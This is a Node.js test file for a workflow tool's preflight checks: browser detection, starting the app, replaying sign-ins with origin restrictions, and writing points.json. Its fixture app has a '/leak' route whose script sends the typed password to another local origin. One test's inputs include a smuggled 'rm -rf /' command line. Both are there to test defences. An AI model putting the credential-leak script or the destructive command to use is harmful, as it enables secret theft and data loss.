// Tests of the preflight of running-a-software-workflow (lib/preflight.cjs): the browser, the
// app that the serve command starts, and the sign-in of the demo scripts, and the points that
// a missing part writes, which check points passes and end sends with the verdict escalate,
// and of the verb film (verbs/film.cjs), which stores the film or the pictures of a scenario.
// The tests that open a page start a real browser, and skip when this machine has none; the
// tests of a film also skip with no ffmpeg and ffprobe.
'use strict';

const assert = require('node:assert/strict');
const childProcess = require('node:child_process');
const crypto = require('node:crypto');
const dgram = require('node:dgram');
const fs = require('node:fs');
const http = require('node:http');
const net = require('node:net');
const os = require('node:os');
const path = require('node:path');
const test = require('node:test');

// A run of Build sets QORY_RUN_ID, which changes where the verbs read the build plan from.
// Only the tests of a run set it.
delete process.env.QORY_RUN_ID;

const MODULES = path.join(__dirname, '../modules');
const PLUGIN = path.join(MODULES, 'core');
const SKILL = path.join(MODULES, 'software-factory/skills/running-a-software-workflow');
const { main } = require(path.join(PLUGIN, 'skills/running-a-workflow/checks.cjs'));
const { LIBRARY } = require(path.join(PLUGIN, 'skills/running-a-workflow/lib/registry.cjs'));
const { preflight } = require(path.join(SKILL, 'workflow-checks.cjs'))(LIBRARY);
const runLists = require(path.join(SKILL, 'lib/run-lists.cjs'));
const { BROWSER_START_MS, findBrowser, keyOf } = require(path.join(SKILL, 'lib/browser.cjs'));
const replay = require(path.join(SKILL, 'lib/replay.cjs'));

const { signInSetups } = replay;
const { watch } = require('./first-line.js');

const tmp = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'preflight-test-')));
test.after(() => fs.rmSync(tmp, { recursive: true, force: true }));

// harnessHome returns a new harness home whose inputs.json has the members of qory.
const harnessHome = (qory) => {
  const dir = fs.mkdtempSync(path.join(tmp, 'home-'));
  fs.writeFileSync(path.join(dir, 'inputs.json'), JSON.stringify({ qory }));
  return dir;
};
// The harness home of the sign-in tests, with no lists in inputs.json, so that no harness home
// of the environment of the tests adds a list. The serve command gets APP_SECRET, the
// password of the app, since no list has its name.
const APP_HOME = harnessHome({});

// A browser of this machine for the sign-in tests: one that the preflight looks for, else the
// Chrome of macOS.
const BROWSER = findBrowser(process.env) ||
  findBrowser(process.env, ['/Applications/Google Chrome.app/Contents/MacOS/Google Chrome']);
const NO_BROWSER = BROWSER ? false
  : 'no browser such as /usr/bin/chromium is installed, so no sign-in can run';
// The most time for a real browser to start in these tests. A run keeps the 15 s of
// lib/browser.cjs, but a start on a CI runner with 2 cores can take longer.
const BROWSER_MS = 60000;
// ffmpeg and ffprobe for the tests of a film, which skip when this machine has none.
const FFMPEG = findBrowser(process.env, ['ffmpeg']);
const FFPROBE = findBrowser(process.env, ['ffprobe']);
const NO_FILM = NO_BROWSER || (FFMPEG && FFPROBE ? false : 'no ffmpeg and ffprobe, so no film');

const P01 = {
  text: 'The dev container has no browser, so the run could not open the app.',
  action: 'run_again',
  fix: 'Add a browser to .devcontainer/devcontainer.json, then run another round.',
};
const P02_TEXT = 'The app did not start in the dev container, so the run could not check the app.';
const P03_FIX = 'Ask an owner or admin of your organisation to add each sign-in variable with ' +
  'the prefix AGENT_ in Workspace settings > Secrets and variables > Variables, then run ' +
  'another round.';
const P03_SETUP_FIX = 'Make the sign-in of the app work with the variables set, then run ' +
  'another round.';
const p03SetupText = (names) => `The sign-in of the app failed with the values of ${names} ` +
  'set in the workspace\'s variables.';
const p03Text = (names) => 'The run could not sign in to the app: the workspace has no ' +
  `AGENT_ variable with a value for ${names}.`;

// The app of the sign-in tests: a sign-in form at /sign-in that sends the reader to /orders
// when the password is APP_SECRET, and shows the form again when it is not. /away redirects
// to the form of another origin, the port OTHER_PORT, /link and /framed show a link to it and
// a frame of it, /clock shows "Start" and, 1.5 s after its load, "Done", /popup posts the
// form to it in a new window, /popup-same opens /orders in a new window at the submit, /leak
// sends the password as a host name of that port at the submit, and /alert shows the form
// with an alert at its load and at each key. The other origin adds a line to the file
// OTHER_LOG for each request.
const APP = `
const fs = require('fs');
const http = require('http');
const other = 'http://127.0.0.1:' + process.env.OTHER_PORT + '/sign-in';
const page = (body) => '<!doctype html><html><body>' + body + '</body></html>';
const form = (wrong) => page('<form method="post" action="/session">' +
  (wrong ? '<p>Wrong password</p>' : '') + '<input id="email" name="email">' +
  '<input id="password" name="password" type="password">' +
  '<button type="submit">Sign in</button></form>');
http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/session') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      if (new URLSearchParams(body).get('password') === process.env.APP_SECRET) {
        res.writeHead(303, { Location: '/orders' });
        res.end();
      } else {
        res.writeHead(200, { 'content-type': 'text/html' });
        res.end(form(true));
      }
    });
    return;
  }
  if (req.url === '/away') {
    res.writeHead(302, { Location: other });
    res.end();
    return;
  }
  res.writeHead(200, { 'content-type': 'text/html' });
  if (req.url === '/link') res.end(page('<a id="go" href="' + other + '">Go</a>'));
  else if (req.url === '/framed') res.end(page('<iframe src="' + other + '"></iframe>'));
  else if (req.url === '/popup-same') {
    res.end(form(false).replace('<form ', '<form onsubmit="event.preventDefault();' +
      'window.open(\\'/orders\\')" '));
  } else if (req.url === '/popup') {
    res.end(form(false).replace('action="/session"', 'action="' + other + '" target="_blank"'));
  } else if (req.url === '/leak') {
    res.end(form(false).replace('</body>', '<script>document.forms[0].addEventListener(' +
      '"submit", (e) => { e.preventDefault(); location.href = "http://" + ' +
      'document.getElementById("password").value + ".localhost:' + process.env.OTHER_PORT +
      '/"; });</script></body>'));
  }
  else if (req.url === '/clock') {
    res.end(page('<h1 id="t">Start</h1><script>setTimeout(() => { document.getElementById("t")' +
      '.textContent = "Done"; }, 1500);</script>'));
  }
  else if (req.url === '/alert') {
    res.end(form(false).replace('</body>', '<script>alert("Welcome");' +
      'addEventListener("keydown", () => alert("Key"));</script></body>'));
  } else res.end(req.url === '/orders' ? page('<h1>Order 1042</h1>') : form(false));
}).listen(Number(process.env.APP_PORT), '127.0.0.1');
if (process.env.OTHER_PORT) {
  http.createServer((req, res) => {
    fs.appendFileSync(process.env.OTHER_LOG, req.method + ' ' + req.url + '\\n');
    res.writeHead(200, { 'content-type': 'text/html' });
    res.end(form(false));
  }).listen(Number(process.env.OTHER_PORT), '127.0.0.1');
}
`;

const SIGN_IN = [
  { do: 'open', url: '/sign-in' },
  { do: 'type', target: '#email', text: 'ana@example.com' },
  { do: 'type', target: '#password', variable: 'DEMO_PASSWORD' },
  { do: 'press', key: 'Enter' },
];

// script returns a demo script of scenario with setup.
const script = (scenario, setup) => ({
  scenario, title: 'Two parcels, one date', evidence: 'film', source: { version: 1 }, setup,
  steps: [{ step: 1, title: 'Open the order.', expected: 'The order shows.',
    actions: [{ do: 'click', target: 'text=Order 1042' }] }],
});

let folders = 0;

// checkout returns a new folder with the app in app/server.cjs and an artifact folder in
// .qory/artifacts.
function checkout() {
  const dir = path.join(tmp, `run-${++folders}`);
  fs.mkdirSync(path.join(dir, 'app'), { recursive: true });
  fs.mkdirSync(path.join(dir, '.qory', 'artifacts'), { recursive: true });
  fs.writeFileSync(path.join(dir, 'app', 'server.cjs'), APP);
  return { dir, root: path.join(dir, '.qory', 'artifacts') };
}

// freePort returns a port of 127.0.0.1 that nothing listens on.
function freePort() {
  return new Promise((resolve) => {
    const server = net.createServer();
    server.listen(0, '127.0.0.1', () => {
      const { port } = server.address();
      server.close(() => resolve(port));
    });
  });
}

// run runs the preflight in the checkout dir with root as its artifact folder.
function run({ dir, root }, parts, { env = {}, ...options } = {}) {
  const io = { cwd: dir, home: process.env.HOME, plugin: PLUGIN,
    env: { ...process.env, ...env }, preflight: { startMs: 5000, ...options } };
  const done = preflight.preflight(io, root, { scripts: [], ...parts });
  // Each finding starts with the step for the session, within 100 characters.
  const first = watch();
  done.findings.forEach((finding) => first.firstLine(finding.split('\n')[0]));
  first.check(done.status);
  return done;
}

// call runs the checks script with argv, and returns { status, out, err }.
function call(argv, deps = {}) {
  let out = '';
  let err = '';
  const status = main(argv, {
    out: { write: (chunk) => { out += chunk; } },
    err: { write: (chunk) => { err += chunk; } },
    plugin: PLUGIN, cwd: tmp, ...deps,
  });
  return { status, out, err };
}

const points = (root) => JSON.parse(fs.readFileSync(path.join(root, 'points.json'), 'utf8'));

// stub writes a qory that records each call's arguments in the file args, prints a work item
// of the run, pulls no verdict, and records the verdict escalate.
function stub() {
  const bin = path.join(tmp, `bin-${++folders}`);
  const store = path.join(bin, 'store');
  fs.mkdirSync(store, { recursive: true });
  const args = path.join(bin, 'args');
  fs.writeFileSync(path.join(bin, 'index.json'), JSON.stringify({ artifacts: [] }));
  fs.writeFileSync(path.join(bin, 'qory'), `#!/bin/sh\nprintf '%s\\n' "$*" >> '${args}'\n` +
    `case "$*" in\n'work-item show') echo '{"run":{"id":"run_9f4n2"}}'; exit 0;;\n` +
    `'artifact pull verdict') cp '${bin}/index.json' '${store}/index.json'; echo '${store}/'; ` +
    'exit 0;;\nesac\necho "Recorded the verdict escalate."\nexit 0\n', { mode: 0o755 });
  return { args, env: { ...process.env, QORY_RUN_ID: 'run-1',
    PATH: `${bin}${path.delimiter}${process.env.PATH}` } };
}

test('preflight: with the app stopped, the session ends escalate with the point of the app', async () => {
  const here = checkout();
  const port = await freePort();
  const command = `node app/missing.cjs --port ${port}`;
  const done = run(here, { serve: { command, url: `http://127.0.0.1:${port}/`, cwd: here.dir } },
    { browsers: [process.execPath] });
  assert.equal(done.status, 1);
  assert.equal(done.findings.length, 1);
  const [first, why, fix] = done.findings[0].split('\n');
  assert.equal(first, 'End the session with points.json: the app did not start in the dev ' +
    'container.');
  assert.match(why, new RegExp('^the command exited with 1 before the address of the app ' +
    'returned a response\\. The output of the command is in .*serve\\.log\\.$'));
  assert.equal(fix, `The fix of its point: Make ${command} start the app in the dev container, ` +
    'then run another round.');
  assert.equal(done.last, 'Checked the browser and the app: 1 of 2 parts is missing, and ' +
    'points.json has a point run_again for each.');
  assert.match(fs.readFileSync(path.join(here.root, '.reports/preflight/serve.log'), 'utf8'),
    /Cannot find module/);
  // The text of the point is about the missing part, and its fix line has the step after it.
  const [point] = points(here.root);
  assert.deepEqual(Object.keys(point), ['text', 'action', 'fix']);
  assert.equal(point.text, P02_TEXT);
  assert.equal(point.action, 'run_again');
  assert.equal(point.fix, `Make ${command} start the app in the dev container, then run ` +
    'another round.');
  // The session checks the points, then the end check sends them with the verdict escalate.
  const file = path.join(here.root, 'points.json');
  const checked = call(['check', 'points', file], { cwd: here.dir });
  assert.equal(checked.status, 0, checked.out + checked.err);
  const { args, env } = stub();
  const ended = call(['end', here.root], { env });
  assert.equal(ended.status, 0, ended.out + ended.err);
  assert.match(ended.err, new RegExp('^Checked points\\.json: the run ended with it, and ' +
    'qory run verdict escalate exited with 0'));
  assert.deepEqual(fs.readFileSync(args, 'utf8').split('\n')
    .filter((line) => line.startsWith('run verdict')), [`run verdict escalate --points ${file}`]);
});

test('preflight: an app whose address responds passes, and its command stops after', async () => {
  const here = checkout();
  const port = await freePort();
  const done = run(here, { serve: { command: 'node app/server.cjs',
    url: `http://127.0.0.1:${port}/sign-in`, cwd: here.dir } },
  { browsers: [process.execPath], env: { APP_PORT: String(port) } });
  assert.deepEqual(done.findings, []);
  assert.equal(done.status, 0);
  assert.equal(done.last, 'Checked the browser and the app: each part is there, and no ' +
    'sign-in: no demo script types a variable in its setup.');
  assert.equal(fs.existsSync(path.join(here.root, 'points.json')), false);
  // The serve command no longer runs, so the port is free again.
  const server = net.createServer();
  await new Promise((resolve, reject) => {
    server.once('error', reject);
    server.listen(port, '127.0.0.1', resolve);
  });
  server.close();
});

test('preflight: an app whose address does not respond in time is missing', () => {
  const here = checkout();
  const done = run(here, { serve: { command: 'sleep 30', url: 'http://127.0.0.1:9/',
    cwd: here.dir } }, { browsers: [process.execPath], startMs: 1000 });
  assert.equal(done.status, 1);
  assert.match(done.findings[0].split('\n')[1],
    /^the address returned no response within 1 s\. /);
  assert.equal(points(here.root)[0].text, P02_TEXT);
});

test('preflight: no browser writes the point of the browser, and with no serve checks no app', () => {
  const here = checkout();
  const done = run(here, { serve: null, scripts: [script('scenario-1', SIGN_IN)] },
    { browsers: [path.join(tmp, 'no-browser')] });
  assert.equal(done.status, 1);
  assert.equal(done.findings[0].split('\n')[0],
    'End the session with points.json: the dev container has no browser.');
  assert.equal(done.findings[0].split('\n')[2], `The fix of its point: ${P01.fix}`);
  assert.match(done.last, /^Checked the browser: 1 of 1 part is missing/);
  assert.deepEqual(points(here.root), [P01]);
  assert.equal(call(['check', 'points', path.join(here.root, 'points.json')],
    { cwd: here.dir }).status, 0);
  // With a browser and no serve command, the preflight passes.
  const passed = run(checkout(), { serve: null }, { browsers: [process.execPath] });
  assert.equal(passed.status, 0);
  assert.equal(passed.last, 'Checked the browser: each part is there, and no app or sign-in: ' +
    'the build plan has no serve command.');
});

test('preflight: a missing browser and a stopped app write two points, and keep the earlier ones', () => {
  const here = checkout();
  const earlier = { text: 'The run could not run its checks script.', action: 'run_again' };
  fs.writeFileSync(path.join(here.root, 'points.json'), JSON.stringify([earlier, P01]));
  const done = run(here, { serve: { command: 'exit 3', url: 'http://127.0.0.1:9/',
    cwd: here.dir }, scripts: [script('scenario-1', SIGN_IN)] }, { browsers: [] });
  assert.equal(done.status, 1);
  assert.equal(done.findings.length, 2);
  const list = points(here.root);
  assert.deepEqual(list.map((one) => one.text), [earlier.text, P01.text, P02_TEXT]);
  assert.equal(call(['check', 'points', path.join(here.root, 'points.json')],
    { cwd: here.dir }).status, 0);
});

test('preflight: a serve command or a variable name that breaks the text of a point takes the fallback words', () => {
  const checks = (point) => {
    const here = checkout();
    const file = path.join(here.root, 'points.json');
    fs.writeFileSync(file, JSON.stringify([point]));
    const done = call(['check', 'points', file], { cwd: here.dir });
    assert.equal(done.status, 0, `${point.fix}\n${done.out}`);
  };
  const fallback = 'Make the serve command of the build plan start the app in the dev ' +
    'container, then run another round.';
  for (const command of ['node . --port 3000', '`npm run dev`', 'npm run **dev**',
    'npm run __dev__', 'make q1', 'cd web && npm start # d-1', `npm run ${'x'.repeat(500)}`,
    'npm run dev\nrm -rf /', '[dev](http://x.test)', '![dev](x.png)']) {
    const point = preflight.pointOf('app', command, { agents: new Set(),
      rules: LIBRARY.pointRules({ ids: ['ac', 'd', 'step', 'scenario', 'decision'] }) });
    assert.equal(point.fix, fallback, command);
    checks(point);
  }
  const kept = preflight.pointOf('app', 'npm run dev -- --port 3000', { agents: new Set(),
    rules: LIBRARY.pointRules() });
  assert.equal(kept.fix, 'Make npm run dev -- --port 3000 start the app in the dev container, ' +
    'then run another round.');
  checks(kept);
  const names = preflight.pointOf('signIn', 'DEMO__PASSWORD', { agents: new Set(),
    rules: LIBRARY.pointRules() });
  assert.equal(names.text, 'The run could not sign in to the app: the workspace has no AGENT_ ' +
    'variable with a value for the sign-in variables of the demo scripts.');
  assert.equal(names.fix, P03_FIX);
  checks(names);
  const setup = preflight.pointOf('signInSetup', 'DEMO__PASSWORD', { agents: new Set(),
    rules: LIBRARY.pointRules() });
  assert.equal(setup.text, 'The sign-in of the app failed with the values of the sign-in ' +
    'variables of the demo scripts set in the workspace\'s variables.');
  assert.equal(setup.fix, P03_SETUP_FIX);
  checks(setup);
  assert.equal(preflight.joined(['A']), 'A');
  assert.equal(preflight.joined(['A', 'B']), 'A and B');
  assert.equal(preflight.joined(['A', 'B', 'C']), 'A, B and C');
});

test('preflight: the preflight stops its runner within the call limit of 585 s', () => {
  // The runner stops its sign-ins at MAX_MS, and the preflight stops the runner STOP_MS later.
  const { CALL_MS } = require(path.join(SKILL, 'lib/budget.cjs'));
  assert.equal(preflight.MAX_MS, 570000);
  assert.equal(preflight.MAX_MS + preflight.STOP_MS, CALL_MS);
  assert.equal(CALL_MS, 585000);
});

test('preflight: the setups that type a variable count once, with their scenarios', () => {
  const other = [{ do: 'open', url: '/' }];
  const setups = signInSetups([script('scenario-1', SIGN_IN), script('scenario-2', other),
    script('scenario-3', SIGN_IN)]);
  assert.deepEqual(setups, [{ actions: SIGN_IN, names: ['DEMO_PASSWORD'],
    scenarios: ['scenario-1', 'scenario-3'] }]);
  assert.deepEqual(keyOf('Enter'), { key: 'Enter', code: 'Enter', keyCode: 13, text: '\r',
    modifiers: 0 });
  assert.equal(keyOf('Control+a').modifiers, 2);
  assert.equal(keyOf('Hyper+a'), null);
  // The runner may take the limit of each action of a setup: 15 s for the page, 15 s for an
  // open, 1 s for a press, the time of a wait, the time of the other actions and the time
  // after the last action.
  assert.equal(preflight.signInMs([...SIGN_IN, { do: 'wait', text: 'x', timeout_ms: 60000 }],
    5000, 10000), 15000 + 10000 + 15000 + 5000 + 5000 + 1000 + 60000);
});

// entry returns the entry of index.json for name of demo-script, with a version of each
// number of numbers, each [number, fields].
const entry = (name, numbers) => ({ type: 'demo-script', name, approved_version: null,
  newest_version: numbers.length ? Math.max(...numbers.map(([number]) => number)) : null,
  versions: numbers.map(([number, fields = {}]) => ({ id: `av_${name}_${number}`, number,
    ...fields })) });

test('preflight: the demo scripts are the newest versions that index.json counts', () => {
  const { root } = checkout();
  const write = (name, number, data) => {
    const dir = path.join(root, 'demo-script', name, `v${number}`);
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, `${name}.json`), JSON.stringify(data));
  };
  const index = (artifacts) => fs.writeFileSync(path.join(root, 'index.json'),
    JSON.stringify({ artifacts }));
  write('scenario-2', 1, script('scenario-2', []));
  write('scenario-10', 1, script('scenario-10', []));
  write('scenario-2', 2, script('scenario-2', SIGN_IN));
  index([entry('scenario-10', [[1]]), entry('scenario-2', [[1], [2]])]);
  const io = { cwd: tmp, home: process.env.HOME };
  const read = () => preflight.demoScripts(root, io)
    .map((one) => [one.scenario, one.setup.length]);
  assert.deepEqual(read(), [['scenario-2', 4], ['scenario-10', 0]]);
  // A leftover folder above the newest version of index.json is not read, and neither is
  // a folder of a name that index.json does not list.
  write('scenario-10', 7, script('scenario-10', SIGN_IN));
  write('scenario-4', 1, script('scenario-4', SIGN_IN));
  assert.deepEqual(read(), [['scenario-2', 4], ['scenario-10', 0]]);
  // A version of a cancelled run counts for nothing, and a withdrawn name is no scenario.
  index([entry('scenario-10', [[1], [7, { cancelled: true }]]),
    entry('scenario-2', [[1], [2], [3, { withdrawn: true }]])]);
  assert.deepEqual(read(), [['scenario-10', 0]]);
  // A store without the folder of the newest version that counts gets the pull line.
  index([entry('scenario-10', [[1]]), entry('scenario-2', [[1], [2], [3]])]);
  assert.throws(read, (error) => error.message === 'Run `qory artifact pull demo-script ' +
    '--version 3`, then check again.');
  index([entry('scenario-3', [[1]])]);
  write('scenario-3', 1, { scenario: 'scenario-3' });
  assert.throws(read,
    /^Error: Push a demo script of scenario-3 that passes its check, then pull it\.$/);
  assert.deepEqual(preflight.demoScripts(checkout().root, io), []);
});

test('preflight: a sign-in opens only the address of the app, and types nothing after another', async () => {
  const calls = [];
  const page = { outside: null,
    goto: async (url) => { calls.push(`goto ${url}`); },
    type: async (target) => { calls.push(`type ${target}`); },
    press: async (key) => { calls.push(`press ${key}`); },
    click: async () => {}, waitText: async () => {}, visible: async () => false,
    poll: async (check) => check(),
  };
  const options = { base: 'http://127.0.0.1:4100/', env: { DEMO_PASSWORD: 'parcel-blue-41' },
    actionMs: 100, signedInMs: 100 };
  for (const url of ['https://sign-in.example.com/', '//sign-in.example.com/form',
    'http://127.0.0.1:4101/sign-in', 'https://127.0.0.1:4100/', 'data:text/html,<form>']) {
    calls.length = 0;
    const done = await replay.signIn(page, [{ do: 'open', url }, ...SIGN_IN.slice(1)], options);
    assert.equal(done.ok, false, url);
    assert.match(done.why, new RegExp('^action 1 \\(open .*\\) failed: the address is ' +
      'outside the app, whose origin is http://127\\.0\\.0\\.1:4100$'));
    assert.equal(done.outside, url.startsWith('data:') ? 'data:'
      : new URL(url, options.base).origin, url);
    assert.deepEqual(calls, [], url);
  }
  // Once the page has failed a load of another origin, the next action fails, and no later
  // action types.
  calls.length = 0;
  const left = { ...page, click: async () => { left.outside = 'https://sign-in.example.com'; } };
  const stopped = await replay.signIn(left, [{ do: 'open', url: '/sign-in' },
    { do: 'click', target: '#go' }, ...SIGN_IN.slice(1)], options);
  assert.deepEqual(stopped, { ok: false, why: 'action 3 (type into #email) failed: the page ' +
    'opened https://sign-in.example.com, outside the app',
  outside: 'https://sign-in.example.com' });
  assert.deepEqual(calls, ['goto http://127.0.0.1:4100/sign-in']);
  // An open of the app, by a path or by its whole address, passes.
  calls.length = 0;
  const passed = await replay.signIn(page, [...SIGN_IN,
    { do: 'open', url: 'http://127.0.0.1:4100/orders' }], options);
  assert.deepEqual(passed, { ok: true, why: null, outside: null });
  assert.deepEqual(calls, ['goto http://127.0.0.1:4100/sign-in', 'type #email',
    'type #password', 'press Enter', 'goto http://127.0.0.1:4100/orders']);
});

// signIn runs the preflight on the app with the setup of the demo scripts, with the value of
// DEMO_PASSWORD, or none when value is undefined, and the variables of more. The other origin
// of the app listens on the port other, and its log of requests is the file otherLog.
async function signIn(setup, value, more = {}) {
  const here = checkout();
  const port = await freePort();
  const other = await freePort();
  const otherLog = path.join(here.dir, 'other.log');
  fs.writeFileSync(otherLog, '');
  const env = { APP_PORT: String(port), APP_SECRET: 'parcel-blue-41',
    QORY_HARNESS_HOME: APP_HOME, OTHER_PORT: String(other),
    OTHER_LOG: otherLog, ...more };
  if (value !== undefined) env.DEMO_PASSWORD = value;
  else env.DEMO_PASSWORD = '';
  const done = run(here, { serve: { command: 'node app/server.cjs',
    url: `http://127.0.0.1:${port}/`, cwd: here.dir },
  scripts: [script('scenario-1', setup), script('scenario-2', setup)] },
  { browsers: [BROWSER], env, startMs: 10000, actionMs: 3000, signedInMs: 3000,
    browserMs: BROWSER_MS });
  return { here, done, port, other, otherLog };
}

// alive reports whether the process pid still runs: on Linux, a process that ended and that
// nothing reaps, state Z in /proc/<pid>/stat, does not.
const alive = (pid) => {
  try {
    process.kill(pid, 0);
  } catch (error) {
    return error.code === 'EPERM';
  }
  try {
    return !/^\d+ \(.*\) Z /.test(fs.readFileSync(`/proc/${pid}/stat`, 'utf8'));
  } catch {
    return true;
  }
};

// isFree resolves to whether nothing listens on port of 127.0.0.1.
function isFree(port) {
  return new Promise((resolve) => {
    const server = net.createServer();
    server.once('error', () => resolve(false));
    server.listen(port, '127.0.0.1', () => server.close(() => resolve(true)));
  });
}

test('preflight: a sign-in with the right value passes', { skip: NO_BROWSER }, async () => {
  const { done } = await signIn(SIGN_IN, 'parcel-blue-41');
  assert.deepEqual(done.findings, []);
  assert.equal(done.last, 'Checked the browser, the app and the sign-in: each part is there.');
  const waited = await signIn([...SIGN_IN, { do: 'wait', text: 'Order 1042' }],
    'parcel-blue-41');
  assert.equal(waited.done.status, 0, waited.done.findings.join('\n'));
});

test('preflight: a sign-in with a wrong value writes the point of the sign-in', { skip: NO_BROWSER }, async () => {
  const { here, done } = await signIn(SIGN_IN, 'wrong-value-7');
  assert.equal(done.status, 1);
  const [first, why, fix] = done.findings[0].split('\n');
  assert.equal(first, 'End the session with points.json: the sign-in to the app failed.');
  assert.equal(why, 'The sign-in of scenario-1 and scenario-2 failed: the page still showed a ' +
    'field that a variable was typed into 3 s after the last action.');
  assert.equal(fix, `The fix of its point: ${P03_SETUP_FIX}`);
  assert.equal(done.findings[0].split('\n').at(-1), 'Kind: setup');
  assert.deepEqual(points(here.root), [{ text: p03SetupText('DEMO_PASSWORD'),
    action: 'run_again', fix: P03_SETUP_FIX }]);
  assert.equal(call(['check', 'points', path.join(here.root, 'points.json')],
    { cwd: here.dir }).status, 0);
  // A wait that never shows its text fails too.
  const waited = await signIn([...SIGN_IN, { do: 'wait', text: 'Order 1042',
    timeout_ms: 2000 }], 'wrong-value-7');
  assert.match(waited.done.findings[0].split('\n')[1],
    /: action 5 \(wait for a text\) failed: the page showed no such text within 2 s\.$/);
});

test('preflight: a sign-in with no value, or a target that is not there, fails with the names', { skip: NO_BROWSER }, async () => {
  const { here, done } = await signIn(SIGN_IN, undefined);
  assert.match(done.findings[0].split('\n')[1],
    /: action 3 \(type into #password\) failed: the variable DEMO_PASSWORD has no value\.$/);
  assert.equal(points(here.root)[0].text, p03Text('DEMO_PASSWORD'));
  assert.equal(done.findings[0].split('\n').at(-1), 'Kind: outside');
  const setup = [...SIGN_IN.slice(0, 2), { do: 'type', target: '#pin', variable: 'DEMO_PIN' },
    ...SIGN_IN.slice(2)];
  const missing = await signIn(setup, 'parcel-blue-41', { DEMO_PIN: '4410' });
  assert.match(missing.done.findings[0].split('\n')[1],
    /: action 3 \(type into #pin\) failed: no element of the target showed within 3 s\.$/);
  assert.equal(points(missing.here.root)[0].text,
    p03SetupText('DEMO_PIN and DEMO_PASSWORD'));
});

// outsidePoint returns the point of a sign-in that loads a page of origin, outside the app at
// address.
const outsidePoint = (address, origin) => ({
  text: `The sign-in of the app at ${address} opens ${origin}, and the run may open only the ` +
    'app\'s pages.',
  action: 'run_again',
  fix: `Make the app's sign-in work in the dev container without leaving ${address}, then run ` +
    'another round.',
});

// The fix of the key stop that the tests of runScript pass, as film passes it.
const KEY_FIX = 'Remove the key from the demo scripts, then run film scenario-1 again.';

// runScript runs a demo script whose setup is SIGN_IN and whose first step has actions, with the
// value of DEMO_PASSWORD, on the app, as demo run does.
async function runSteps(actions, value) {
  const here = checkout();
  const port = await freePort();
  const env = { ...process.env, APP_PORT: String(port), APP_SECRET: 'parcel-blue-41',
    QORY_HARNESS_HOME: APP_HOME,
    DEMO_PASSWORD: value };
  const io = { cwd: here.dir, home: process.env.HOME, plugin: PLUGIN, env,
    preflight: { browsers: [BROWSER], startMs: 10000, actionMs: 3000, signedInMs: 3000,
      browserMs: BROWSER_MS } };
  const one = script('scenario-1', SIGN_IN);
  one.steps = actions.map((list, place) => ({ step: place + 1, title: 'Step.', expected: 'Seen.',
    actions: list }));
  return preflight.runScript(io, here.root, { serve: { command: 'node app/server.cjs',
    url: `http://127.0.0.1:${port}/`, cwd: here.dir }, script: one, keyFix: KEY_FIX });
}

test('runScript: a script whose setup and steps pass runs once and passes',
  { skip: NO_BROWSER }, async () => {
  const got = await runSteps([[{ do: 'wait', text: 'Order 1042' }]], 'parcel-blue-41');
  assert.deepEqual(got.run, { ok: true, step: null, why: null, outside: null });
});

test('runScript: a step that fails ends the run with its number, and a failed sign-in is step 0',
  { skip: NO_BROWSER }, async () => {
  const late = await runSteps([[{ do: 'wait', text: 'Order 1042' }],
    [{ do: 'click', target: '#nothing' }]], 'parcel-blue-41');
  assert.equal(late.run.ok, false);
  assert.equal(late.run.step, 2);
  assert.match(late.run.why, /^action 1 \(click #nothing\) failed: /);
  const wrong = await runSteps([[{ do: 'wait', text: 'Order 1042' }]], 'wrong-value-7');
  assert.equal(wrong.run.ok, false);
  assert.equal(wrong.run.step, 0);
});

test('runScript: with no browser on the machine, it runs nothing', () => {
  const here = checkout();
  const io = { cwd: here.dir, home: process.env.HOME, plugin: PLUGIN, env: process.env,
    preflight: { browsers: [path.join(tmp, 'no-browser')] } };
  const given = { serve: { command: 'true', url: 'http://127.0.0.1:9/', cwd: here.dir },
    script: script('scenario-1', SIGN_IN) };
  const got = preflight.runScript(io, here.root, { ...given, keyFix: KEY_FIX });
  assert.deepEqual(got, { browser: null });
});

test('runScript: a call without keyFix throws an Error that names keyFix', () => {
  const here = checkout();
  const io = { cwd: here.dir, home: process.env.HOME, plugin: PLUGIN, env: process.env,
    preflight: { browsers: [path.join(tmp, 'no-browser')] } };
  const given = { serve: { command: 'true', url: 'http://127.0.0.1:9/', cwd: here.dir },
    script: script('scenario-1', SIGN_IN) };
  for (const keyFix of [undefined, '']) {
    assert.throws(() => preflight.runScript(io, here.root, { ...given, keyFix }),
      (error) => error.constructor === Error && error.message === 'runScript needs keyFix');
  }
});

test('preflight: a sign-in that opens another site writes the point of the page outside the app', { skip: NO_BROWSER }, async () => {
  const { here, done, port } = await signIn([{ do: 'open', url: 'https://sign-in.example.com/' },
    ...SIGN_IN.slice(1)], 'parcel-blue-41');
  assert.equal(done.status, 1);
  const [first, why, fix] = done.findings[0].split('\n');
  assert.equal(first, 'End the session with points.json: the sign-in opened a page outside the ' +
    'app.');
  assert.equal(why, 'The sign-in of scenario-1 and scenario-2 failed: action 1 (open ' +
    'https://sign-in.example.com/) failed: the address is outside the app, whose origin is ' +
    `http://127.0.0.1:${port}.`);
  const address = `http://127.0.0.1:${port}/`;
  assert.equal(fix,
    `The fix of its point: ${outsidePoint(address, 'https://sign-in.example.com').fix}`);
  assert.deepEqual(points(here.root), [outsidePoint(address, 'https://sign-in.example.com')]);
  const checked = call(['check', 'points', path.join(here.root, 'points.json')], { cwd: here.dir });
  assert.equal(checked.status, 0, checked.out);
});

test('preflight: a redirect, a link or a frame to another origin loads nothing there, and types nothing', { skip: NO_BROWSER }, async () => {
  for (const [setup, action] of [
    [[{ do: 'open', url: '/away' }, ...SIGN_IN.slice(1)], 'action 1 (open /away)'],
    [[{ do: 'open', url: '/link' }, { do: 'click', target: '#go' }, ...SIGN_IN.slice(1)],
      'action 3 (type into #email)'],
    [[{ do: 'open', url: '/framed' }, ...SIGN_IN.slice(1)], 'action 2 (type into #email)'],
  ]) {
    const { here, done, port, other, otherLog } = await signIn(setup, 'parcel-blue-41');
    const words = setup[0].url;
    assert.equal(done.status, 1, words);
    assert.equal(done.findings.length, 1, done.findings.join('\n'));
    const origin = `http://127.0.0.1:${other}`;
    assert.equal(done.findings[0].split('\n')[1], 'The sign-in of scenario-1 and scenario-2 ' +
      `failed: ${action} failed: the page opened ${origin}, outside the app.`, words);
    assert.deepEqual(points(here.root), [outsidePoint(`http://127.0.0.1:${port}/`, origin)], words);
    // The browser sent no request to the other origin, so no value of a variable went there.
